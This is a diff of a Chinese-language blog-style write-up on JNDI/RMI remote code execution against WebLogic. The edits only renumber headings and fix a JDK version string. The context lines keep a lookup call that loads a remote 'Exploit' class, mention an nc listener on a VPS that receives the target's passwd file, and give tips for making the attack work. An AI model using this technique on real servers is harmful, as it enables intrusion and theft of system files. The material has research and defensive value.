@@ -162,7 +162,7 @@ Object object = context.lookup("rmi://remote_server/Exploit");
 ![calc2](https://ob5vt1k7f.qnssl.com/fcbQR)
 
 
-### 0x03 测试Weblogic
+### 0x04 测试Weblogic
 下面我们测试一下在实战中能否利用rmi远程代码执行
 PoC
 ```
@@ -206,12 +206,12 @@ VPS上nc监听3388端口，执行成功的话会接收到目标主机的passwd�
 
 
 
-### 0x04 总结
+### 0x05 总结
 简单总结一下这个利用方式，有几个需要注意的点
 
 - java版本问题。编译恶意类的java版本，生成jar包的版本，目标运行的java版本需要一致，这在一定程度上限制了通用性
 
-	再一个，java版本不能高于7，因为在jdk8中做了限制，需要设置`trustURLCodebase`为`true`
+	再一个，java版本不能高于7，因为在jdk1.8中做了限制，需要设置`trustURLCodebase`为`true`
 
 - 需要指定`rmi.server.hostname`，在这里坑了好久，一开始以为是ipv6的问题，因为在vps上绑定jndi服务后监听的是tcp6，在github上也有人提了这个问题；后来发现本地执行客户端后与远程主机是建立连接的，却卡在了这个连接上，没有消息通信，说明tcp通道是可以建立的，应该是别的地方有问题。执行后jndi服务器去找了127.0.0.1，一开始以为是本地地址，测试了一番之后发现原来是vps的127.0.0.1，说明已经执行到远程类的部分了，只不过解析地址的时候出现了错误，后来在[stackoverflow](https://stackoverflow.com/questions/15685686/java-rmi-connectexception-connection-refused-to-host-127-0-1-1)和[这里](http://kbase.zohocorp.com/kbase/Web_NMS/Server_Framework/file_112641.html)找到了答案。
 
